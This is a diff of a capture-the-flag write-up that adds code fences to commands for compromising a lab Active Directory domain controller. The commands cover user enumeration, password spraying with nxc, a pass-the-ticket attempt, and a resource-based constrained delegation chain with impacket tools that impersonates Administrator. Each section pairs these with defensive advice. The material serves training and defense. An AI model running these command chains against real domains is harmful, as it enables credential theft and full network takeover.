@@ -63,12 +63,12 @@ Restrict RDP access to non‑administrative accounts and enforce multi‑factor 
 
 Host/Domain Enumeration
 =======================
-net user
+``` net user ```
 <img width="485" height="255" alt="forward_1_dc_users" src="https://github.com/user-attachments/assets/b17bf299-7813-4ea0-8356-c54f78491abd" />
-
+```
 net user /domain
 net user j.smith
-
+```
 <img width="440" height="310" alt="forward_1_dc_user_jsmith" src="https://github.com/user-attachments/assets/d4ab2dd2-c440-4bca-a049-e979f433503c" />
 
 As the target was a Domain Controller, local accounts were effectively domain accounts because the local SAM database is replaced with the ntds.dit database. The results were identical, and the domain name (e.g., ctf.local) was not required as a prefix. Group details confirmed why we were able to log in via RDP.
@@ -86,9 +86,9 @@ Directory enumeration was an important step. We ensured to enumerate the logged�
 
 We opened the file with KeePass, successfully logged in, and retrieved additional credentials:
 t.jones:redacted
-
+```
 runas /user:t.jones cmd.exe
-
+```
 We then checked these credentials against existing domain users. Logging in as t.jones revealed no special privileges; it was just a standard domain account.
 
 Sensitive files like KeePass databases should not be stored in user directories. Monitor for access to password vault files.
@@ -96,15 +96,15 @@ Sensitive files like KeePass databases should not be stored in user directories.
 **Elevate Privilege – Password Spraying**
 =====================================
 Password spraying revealed valid credentials for r.williams.
-
+```
 nxc smb 10.130.187.188 -u users.txt -p "redacted" --continue-on-success
 nxc rdp 10.130.187.188 -u users.txt -p "redacted" --continue-on-success
-
+```
 <img width="947" height="245" alt="forward_3_dc_user_rwilliams_creds" src="https://github.com/user-attachments/assets/8f3e6676-8115-4d92-8b66-3c65539239e6" />
-
+```
 net user r.williams
 net localgroup sysadmin
-
+```
 <img width="362" height="303" alt="forward_3_dc_user_rwilliams" src="https://github.com/user-attachments/assets/4751a9c6-1f2a-4b04-899d-06e60aba9225" />
 
 On the desktop, there was an automation notice in the r.williams folder.
@@ -115,12 +115,12 @@ Implement account lockout policies and MFA to prevent password spraying. Audit p
 
 **Kerberos Ticket Attempt (Informational)**
 ===========================================
-
+```
 base64 -d Helpdesk-Auth.b64 > ticket.kirbi
 ticketConverter.py share/ticket.kirbi cool.ccache
 export KRB5CCNAME=cool.ccache
 psexec.py ctf.local\svc.scanner@10.130.187.188 -k -no-pass -dc-ip 10.130.187.188
-
+```
 <img width="551" height="366" alt="forward_4_dc_ticket_expire" src="https://github.com/user-attachments/assets/d0aa6268-558a-4b29-8ba7-c6e5eb448755" />
 
 We attempted to use a base64‑encoded Kerberos ticket for pass‑the‑ticket, but the ticket had already expired.
@@ -137,10 +137,12 @@ Delegation rights should be audited frequently to identify and remove unnecessar
 
 **Resource‑Based Constrained Delegation**
 =======================================
+```
 addcomputer.py 'ctf.local/r.williams:redacted' -dc-host dc01.ctf.local -dc-ip 10.130.187.188
 rbcd.py -delegate-from 'DESKTOP-MXG694WM$' -delegate-to 'DC01$' -action write 'ctf.local/r.williams:redacted!' -dc-host DC01.ctf.local -dc-ip 10.130.187.188
 getST.py -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/DESKTOP-MXG694WM$:D27KJpsURErSaQuKa5D4sPerWVxdtrlS' -dc-ip 10.130.187.188
 psexec.py ctf.local/Administrator@dc01.ctf.local -no-pass -k
+```
 
 We used RBCD to impersonate the Administrator and gained full access to the Domain Controller.
 
